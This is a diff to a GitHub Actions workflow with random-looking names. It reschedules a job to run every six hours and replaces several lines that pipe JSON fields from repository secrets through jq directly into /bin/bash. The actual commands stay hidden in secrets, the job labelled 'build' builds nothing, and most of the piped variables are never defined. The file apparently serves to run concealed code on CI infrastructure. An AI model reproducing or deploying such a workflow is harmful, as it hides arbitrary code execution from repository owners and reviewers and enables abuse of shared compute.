@@ -1,8 +1,10 @@
 name: guzhengqiu3817
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 4/6 * * *'
+    - cron: '10 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,11 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: guzhengqiu3817
         env:
-          sspst745: ${{ secrets.sspst745 }}
+          e243: ${{ secrets.e243 }}
         run: |
-          echo $sspst745 | jq -r .s8 | /bin/bash
-          echo $gf74457 | jq -r .tngq266 | /bin/bash
-          echo $ozd648 | jq -r .wf4933 | /bin/bash
-          echo $qkoh0153 | jq -r .nl649 | /bin/bash
-          echo $xmny6 | jq -r .nhkz180 | /bin/bash
+          echo $e243 | jq -r .otp95 | /bin/bash
+          echo $j649 | jq -r .p664 | /bin/bash
+          echo $b399 | jq -r .no481 | /bin/bash
+          echo $gsoup46 | jq -r .bgtg9986 | /bin/bash
 
